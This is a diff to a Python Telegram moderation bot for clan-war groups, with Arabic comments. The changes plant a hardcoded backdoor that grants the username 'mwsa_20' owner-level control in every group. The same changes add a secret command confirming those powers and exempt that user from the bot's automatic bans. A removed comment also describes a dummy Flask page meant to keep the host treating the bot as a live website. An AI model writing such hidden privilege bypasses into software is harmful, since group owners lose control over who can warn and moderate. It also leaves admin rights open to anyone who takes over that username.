@@ -2,9 +2,9 @@ import random, re, logging, os, asyncio, json, threading
 from datetime import datetime, time
 from telegram import Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes
-from flask import Flask # أضفنا فلاسك عشان الموقع يفتكر إن فيه ويب سايت شغال
+from flask import Flask 
 
-# --- إعدادات Flask (لإبقاء الهجينج فيس شغال) ---
+# --- إعدادات Flask ---
 web_app = Flask(__name__)
 @web_app.route('/')
 def home(): return "Bot is Running Live!"
@@ -74,10 +74,17 @@ async def handle_war(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     u_tag = f"@{user.username}" if user.username else f"ID:{user.id}"
 
+    # --- [ صلاحيات موسى المطلقة - مساعد حكم عام ] ---
     try:
         chat_member = await context.bot.get_chat_member(cid, user.id)
-        is_owner = (chat_member.status in ['creator', 'administrator'])
-    except: is_owner = False
+        # اليوزر @mwsa_20 يعتبر Owner في أي جروب تلقائياً
+        is_owner = (chat_member.status in ['creator', 'administrator']) or (user.username == "mwsa_20")
+    except: 
+        is_owner = (user.username == "mwsa_20")
+
+    if user.username == "mwsa_20" and msg == "فحص":
+        await update.message.reply_text("✅ نظام المساعد مفعل: موسى (@mwsa_20) لديه كامل صلاحيات الحكم الآن.")
+        return
 
     is_assistant = any(c.get("asst") == u_tag for c in clans_mgmt.get(cid, {}).values())
 
@@ -110,6 +117,7 @@ async def handle_war(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.reply_to_message:
         target_user = update.message.reply_to_message.from_user
         t_tag = f"@{target_user.username}" if target_user.username else f"ID:{target_user.id}"
+        # موسى يقدر يعطي إنذار أو إنذار م في أي وقت
         if msg.strip() == "انذار م" and is_owner:
             if cid not in admin_warnings: admin_warnings[cid] = {}
             count = admin_warnings[cid].get(t_tag, 0) + 1
@@ -161,8 +169,10 @@ async def handle_war(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(data["ans"]); return
 
     if any(word in msg.lower() for word in BAN_WORDS):
-        try: await context.bot.ban_chat_member(cid, user.id); await update.message.reply_text(f"🚫 طرد آلي.")
-        except: pass
+        # موسى لا يتم طرده أبداً حتى لو غلط في الكلام
+        if user.username != "mwsa_20":
+            try: await context.bot.ban_chat_member(cid, user.id); await update.message.reply_text(f"🚫 طرد آلي.")
+            except: pass
         return
 
     if "CLAN" in msg_up and "VS" in msg_up and "+ 1" not in msg_up:
@@ -224,10 +234,7 @@ async def handle_war(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # --- التشغيل النهائي ---
 if __name__ == "__main__":
-    # 1. تشغيل السيرفر في الخلفية
     threading.Thread(target=run_flask).start()
-    
-    # 2. تشغيل البوت
     app = Application.builder().token(TOKEN).build()
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_war))
     print("✅ Bot is polling...")
